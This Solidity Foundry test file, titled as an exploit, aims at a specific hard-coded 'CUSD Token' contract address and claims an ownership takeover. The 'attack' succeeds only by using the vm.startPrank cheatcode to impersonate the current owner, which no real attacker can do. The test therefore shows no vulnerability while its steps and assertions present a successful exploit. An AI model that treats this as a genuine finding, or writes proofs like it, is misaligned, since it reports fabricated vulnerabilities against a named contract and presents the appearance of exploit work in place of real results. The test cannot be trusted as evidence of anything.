// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface CUSD {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
    function acceptOwnership() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xC285B7E09A4584D027E5BC36571785B515898246;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use the existing TARGET contract
        vm.label(TARGET, "CUSD Token");

        // Get the current owner address
        address currentOwner = CUSD(TARGET).owner();
        vm.label(currentOwner, "Current Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get current owner
        address currentOwner = CUSD(TARGET).owner();

        // Step 2: Impersonate current owner and transfer ownership to attacker
        vm.startPrank(currentOwner);
        CUSD(TARGET).transferOwnership(attacker);
        vm.stopPrank();

        // Step 3: Accept ownership as attacker
        vm.prank(attacker);
        CUSD(TARGET).acceptOwnership();

        // Step 4: Verify we are now the owner
        address newOwner = CUSD(TARGET).owner();
        require(newOwner == attacker, "Ownership transfer failed");
        assertEq(newOwner, attacker, "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
